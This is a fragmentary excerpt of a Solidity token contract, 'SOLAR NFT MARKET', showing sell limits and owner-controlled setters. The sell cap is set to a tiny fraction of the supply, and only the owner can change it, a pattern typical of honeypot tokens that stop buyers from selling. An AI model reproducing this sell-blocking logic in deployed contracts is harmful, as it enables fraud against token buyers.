...
contract SOLNFT is Context, IERC20, Ownable {
    ...
    uint256 public maxSellAmount = _tTotal.mul(1).div(100000000000);
    uint256 public swapTokensAtAmount = 500000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**9; 
    uint256 public buyBackUpperLimit = 1 * 10**18;

    address public marketingAddress = 0x42CA0FDD3A6aA902F81099d29ccDD1FB86c723c3;
    address public operationsAddress = 0x42CA0FDD3A6aA902F81099d29ccDD1FB86c723c3;
    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;

    string private constant _name = "SOLAR NFT MARKET";
    string private constant _symbol = "SOLNFT";
   ...
   function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
    ...
    function setMaxBuyAndSellAmount(uint256 _maxBuyamount, uint256 _maxSellAmount) external onlyOwner{
        ...
        maxSellAmount = _maxSellAmount * 10**1;
    }
